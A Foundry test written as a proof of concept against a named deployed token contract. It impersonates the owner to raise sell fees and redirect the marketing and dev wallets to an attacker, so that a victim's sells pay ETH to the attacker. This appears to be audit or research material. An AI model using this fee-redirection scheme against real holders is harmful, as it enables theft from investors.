pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface MarvinInu {
    function owner() external view returns (address);
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function updateMarketingWallet(address newMarketingWallet) external;
    function updateDevWallet(address newWallet) external;
    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external;
    function enableTrading() external;
    function updateSwapEnabled(bool enabled) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    MarvinInu internal token = MarvinInu(TARGET);
    IUniswapV2Router02 internal router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal weth = router.WETH();
    address internal owner;
    address internal victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        owner = token.owner();
        victim = makeAddr("victim");

        uint256 swapThreshold = token.swapTokensAtAmount();
        uint256 requiredVictimBalance = swapThreshold * 2;
        deal(address(token), victim, requiredVictimBalance);

        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 swapThreshold = token.swapTokensAtAmount();
        uint256 victimBalance = swapThreshold * 2;
        uint256 attackerBefore = attacker.balance;

        vm.startPrank(owner);
        token.enableTrading();
        token.updateSwapEnabled(true);
        token.updateSellFees(25, 25, 0);
        token.updateMarketingWallet(attacker);
        token.updateDevWallet(attacker);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(router), victimBalance);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            victimBalance,
            0,
            path,
            victim,
            block.timestamp
        );

        uint256 secondSell = swapThreshold;
        deal(address(token), victim, secondSell);
        token.approve(address(router), secondSell);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            secondSell,
            0,
            path,
            victim,
            block.timestamp
        );
        vm.stopPrank();

        assertGt(attacker.balance, attackerBefore, "Attacker did not gain ETH");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

